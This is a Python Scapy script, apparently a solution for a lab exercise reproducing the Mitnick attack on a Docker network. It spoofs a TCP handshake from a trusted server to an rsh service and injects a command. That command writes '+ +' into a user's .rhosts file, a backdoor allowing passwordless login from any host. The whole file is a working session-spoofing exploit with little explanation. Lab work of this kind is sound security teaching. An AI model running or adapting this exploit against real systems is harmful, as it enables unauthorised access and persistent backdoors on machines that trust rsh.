#!/usr/bin/python3
from scapy.all import *
import subprocess, time, os

# ----------------------
# Configurable Variables
# ----------------------
X_IP = "10.9.0.5"      # X-Terminal
X_PORT = 514           # rsh service port
SRV_IP = "10.9.0.6"    # Trusted server
SRV_PORT = 1023        # rsh source port
ERR_PORT = 9090        # Error port for 2nd connection

# Payload Options:
# data = b"9090\\x00seed\\x00seed\\x00touch /tmp/xyz\\x00"
data = b"9090\\x00seed\\x00seed\\x00echo + + > /home/seed/.rhosts\\x00"

# ----------------------
# Detect Docker Bridge Interface
# ----------------------
def find_bridge():
    try:
        out = subprocess.check_output(
            "ip -br link | awk '/^br-/{print $1}'",
            shell=True
        ).decode().strip().splitlines()
        if out:
            return out[0]
    except Exception as e:
        print("[!] Bridge auto-detect failed:", e)
    return "lo"

IFACE = os.environ.get("IFACE") or find_bridge()
print(f"[i] Using iface: {IFACE}")

established = False

# ----------------------
# Send spoofed SYN
# ----------------------
def send_spoofed_syn_once():
    syn = IP(src=SRV_IP, dst=X_IP) / TCP(sport=SRV_PORT, dport=X_PORT, flags="S")
    send(syn, verbose=0, iface=IFACE)
    print("[>] Spoofed SYN sent")

# ----------------------
# Handle packets
# ----------------------
def on_pkt(pkt):
    global established
    if not (IP in pkt and TCP in pkt):
        return
    ip, tcp = pkt[IP], pkt[TCP]

    if (ip.src == X_IP and ip.dst == SRV_IP
        and tcp.sport == X_PORT and tcp.dport == SRV_PORT
        and tcp.flags == "SA"):
        
        s_seq, a_seq = tcp.seq, tcp.ack
        print(f"[+] Got SYN+ACK SEQ={s_seq} ACK={a_seq}")

        # Send spoofed ACK
        ack = IP(src=SRV_IP, dst=X_IP) / TCP(
            sport=SRV_PORT, dport=X_PORT, flags="A", seq=a_seq, ack=s_seq + 1
        )
        send(ack, verbose=0, iface=IFACE)
        print("[+] Spoofed ACK sent")

        # Inject rsh command
        push = IP(src=SRV_IP, dst=X_IP) / TCP(
            sport=SRV_PORT, dport=X_PORT, flags="PA", seq=a_seq, ack=s_seq + 1
        )
        send(push / data, verbose=0, iface=IFACE)
        print(f"[+] Injected rsh command: {data}")
        established = True

# ----------------------
# Start sniffing
# ----------------------
bpf = f"tcp and src host {X_IP} and dst host {SRV_IP} and src port {X_PORT} and dst port {SRV_PORT}"
print(f"[i] Sniffing filter: {bpf}")

send_spoofed_syn_once()
sniffer = AsyncSniffer(filter=bpf, prn=on_pkt, iface=IFACE, store=False)
sniffer.start()

deadline = time.time() + 30
while not established and time.time() < deadline:
    time.sleep(1.0)
    send_spoofed_syn_once()

sniffer.stop()

if established:
    print("[✓] First TCP connection spoofed successfully.")
else:
    print("[x] Timed out waiting for SYN+ACK. Check setup.")
